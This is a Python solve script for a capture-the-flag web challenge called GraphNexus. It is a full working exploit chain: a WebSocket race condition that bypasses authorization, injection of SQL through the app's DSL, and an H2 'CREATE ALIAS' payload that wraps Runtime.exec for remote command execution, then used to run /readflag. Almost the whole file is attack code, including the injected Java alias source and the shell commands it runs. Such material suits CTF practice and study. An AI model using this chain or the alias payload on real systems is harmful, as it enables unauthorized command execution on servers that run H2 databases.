#!/usr/bin/env python3
"""scripts/12063-solve.py — 2026 羊城杯 / DASCTF 12063 GraphNexus (WEB, HARD)

Full chain, reproducible end-to-end:

  ① WebSocket 协议级竞态  -> ② DSL 注入 -> ③ H2 CREATE ALIAS -> RCE -> /readflag

USAGE
    python3 scripts/12063-solve.py <host> <port>            # e.g. <target> 20308
    python3 scripts/12063-solve.py <host> <port> --check    # self-check, no RCE

WHAT THE RACE IS (this is the whole trick)
    The Ktor app arms the connection's authorization from its session hello.
    Send SUBSCRIBE (0x03) AFTER parsing the 101 response headers but BEFORE
    consuming the hello frame and the server serves it:
        {"subscribed":true,"token":"nxs_..","permissions":"read,query,export,import"}
    Three counter-examples pin the window down — all documented in
    notes/12063-GraphNexus.md:
        * drain the hello first            -> SUBSCRIBE_FAILED  (too late)
        * pipeline it into the upgrade TCP segment -> dropped    (too early)
        * race two connections against each other  -> no effect  (window is intra-connection)
    Room name, WS mask and handshake query params are all irrelevant decoys.

PROTOCOL  frame = "NXUS" | opcode:1 | len:int32 BE | payload
    0x03 subscribe  0x04 update(payload ignored)  0x05 DSL  0x06 export(GNX)
    0x07 import(GNX)  0x08 reply  0x09 error  0x0a ack
DSL   0x05 payload is the RAW DSL string (not a JSON field):
      NODES.count | NODES.all | NODES.find(q) | EDGES.count | SQL(query)
      The SQL(...) wrapper drops the payload's LAST character, so every SQL is
      terminated with a sacrificial space:  "SQL(<sql> )".

Depends only on the stdlib.
"""
import base64
import json
import os
import re
import socket
import sys
import time

FLAG_RE = re.compile(r"DASCTF\{[^}]+\}")


# --------------------------------------------------------------- framing
def build(op, payload=b""):
    if isinstance(payload, str):
        payload = payload.encode()
    return b"NXUS" + bytes([op]) + len(payload).to_bytes(4, "big") + payload


def ws_frame(p, op=0x2):
    n = len(p)
    h = bytearray([0x80 | op])
    if n < 126:
        h.append(0x80 | n)
    elif n < 65536:
        h.append(0x80 | 126)
        h += n.to_bytes(2, "big")
    else:
        h.append(0x80 | 127)
        h += n.to_bytes(8, "big")
    mk = os.urandom(4)
    return bytes(h) + mk + bytes(b ^ mk[i % 4] for i, b in enumerate(p))


def decode(data):
    out, i = [], 0
    while i + 2 <= len(data):
        b0, b1 = data[i], data[i + 1]
        op, n = b0 & 0xF, b1 & 0x7F
        i += 2
        if n == 126:
            n = int.from_bytes(data[i:i + 2], "big")
            i += 2
        elif n == 127:
            n = int.from_bytes(data[i:i + 8], "big")
            i += 8
        pl = data[i:i + n]
        i += n
        if op == 0x8:
            out.append(("CLOSE", pl))
            break
        if op in (0x9, 0xA):
            out.append(("CTRL", pl))
            continue
        if pl[:4] == b"NXUS" and len(pl) >= 9:
            ln = int.from_bytes(pl[5:9], "big")
            out.append((pl[4], pl[9:9 + ln]))
        else:
            out.append((None, pl))
    return out


def read(s, secs):
    buf = b""
    s.settimeout(secs)
    try:
        while True:
            c = s.recv(262144)
            if not c:
                break
            buf += c
    except socket.timeout:
        pass
    return buf


class GraphNexus:
    def __init__(self, host, port, timeout=10):
        self.host, self.port, self.timeout = host, port, timeout
        self.s = None
        self.subscribed = False

    # ---- stage 1: win the race ----
    def connect_and_subscribe(self, room='{"room":"main"}'):
        s = socket.create_connection((self.host, self.port), timeout=self.timeout)
        key = base64.b64encode(os.urandom(16)).decode()
        s.sendall((f"GET /ws/collab HTTP/1.1\r\nHost: {self.host}\r\n"
                   "Upgrade: websocket\r\nConnection: Upgrade\r\n"
                   f"Sec-WebSocket-Key: {key}\r\n"
                   "Sec-WebSocket-Version: 13\r\n\r\n").encode())
        buf = b""
        while b"\r\n\r\n" not in buf:          # headers only -> stay in the window
            c = s.recv(1)
            if not c:
                raise IOError("closed during handshake")
            buf += c
        s.sendall(ws_frame(build(0x03, room)))  # <<< the race
        frames = decode(read(s, 1.5))
        ok = any(b"subscribed" in (p or b"") for _, p in frames)
        self.s, self.subscribed = s, ok
        return ok

    def subscribe_with_retry(self, attempts=8, pause=2.0):
        """The server throttles after heavy probing; a short pause restores it."""
        for i in range(attempts):
            try:
                if self.connect_and_subscribe():
                    return True
            except Exception as e:
                print(f"    attempt {i}: {e}")
            if self.s:
                self.s.close()
                self.s = None
            time.sleep(pause)
        return False

    # ---- stage 2: DSL ----
    def dsl(self, raw):
        try:
            self.s.sendall(ws_frame(build(0x05, raw)))
            data = read(self.s, 1.5)
        except (ConnectionResetError, BrokenPipeError, OSError):
            # the server throttles/aborts under load: re-enter the race and retry once
            time.sleep(2.0)
            self.s = None
            if not self.subscribe_with_retry(attempts=4):
                return [{"error": "reconnect failed"}]
            self.s.sendall(ws_frame(build(0x05, raw)))
            data = read(self.s, 1.5)
        out = []
        for op, p in decode(data):
            if p[:4] == b"GNX!":
                out.append({"gnx_bytes": len(p)})
                continue
            try:
                out.append(json.loads(p.decode("utf-8", "replace")))
            except Exception:
                out.append(p.decode("utf-8", "replace"))
        return out

    def sql(self, statement):
        """SQL(<stmt> ) — the trailing space is eaten by the naive DSL wrapper."""
        return self.dsl("SQL(%s )" % statement)

    def call(self, fn, arg):
        """Run a CREATE ALIAS function and return its raw string output."""
        stmt = "CALL %s('%s') " % (fn, arg.replace("'", "''"))
        for res in self.sql(stmt):
            if isinstance(res, dict) and isinstance(res.get("result"), list):
                for row in res["result"]:
                    if isinstance(row, dict) and row:
                        return str(list(row.values())[0])
            if isinstance(res, dict) and res.get("error"):
                return "ERR: " + str(res["error"])[:300]
        return ""

    # ---- stage 3: H2 CREATE ALIAS -> RCE ----
    def deploy_exec_alias(self, name="EXECF"):
        # the alias may already exist from an earlier run: probe before creating
        who = self.call(name, "id")
        if "uid=" in who:
            return True, who
        src = ('CREATE ALIAS %s AS $$ String f(String c) throws Exception {'
               ' java.util.Scanner sc = new java.util.Scanner('
               'Runtime.getRuntime().exec(new String[]{"sh","-c",c})'
               '.getInputStream()).useDelimiter("\\\\A");'
               ' return sc.hasNext() ? sc.next() : ""; } $$' % name)
        self.sql(src)
        out = self.call(name, "id")
        return ("uid=" in out), out

    def close(self):
        if self.s:
            try:
                self.s.sendall(ws_frame(b"\x03\xe8", op=0x8))
            except Exception:
                pass
            try:
                self.s.close()
            except Exception:
                pass


def main():
    if len(sys.argv) < 3:
        print(__doc__)
        return 2
    host, port = sys.argv[1], int(sys.argv[2])
    check_only = "--check" in sys.argv

    g = GraphNexus(host, port)
    print("[1] racing the WebSocket subscribe window ...")
    if not g.subscribe_with_retry():
        print("    FAILED to subscribe (server may be throttling; retry later)")
        return 1
    print("    subscribed -> read,query,export,import")
    try:
        print("[2] DSL reachability ...")
        print("    NODES.count ->", g.dsl("NODES.count"))
        ver = g.sql("SELECT H2VERSION()")
        print("    H2         ->", ver)
        if check_only:
            print("[check] chain reachable, stopping before RCE")
            return 0

        print("[3] deploying H2 CREATE ALIAS -> Runtime.exec ...")
        ok, who = g.deploy_exec_alias()
        print("    id ->", who.strip())
        assert ok, "RCE did not return uid="

        print("[4] hunting the flag ...")
        print("    " + g.call("EXECF",
                             "ls -la /readflag /flag.txt 2>&1").strip().replace("\n", "\n    "))
        flag_out = g.call("EXECF", "/readflag 2>&1")
        m = FLAG_RE.search(flag_out)
        if not m:
            print("    no flag from /readflag:", flag_out[:300])
            return 1
        flag = m.group(0)
        print("\nFLAG:", flag)
        print("submit: CTF_AGENT=web-12063 python3 scripts/ycb.py submit 12063 '%s'" % flag)
        return 0
    finally:
        g.close()


if __name__ == "__main__":
    sys.exit(main())
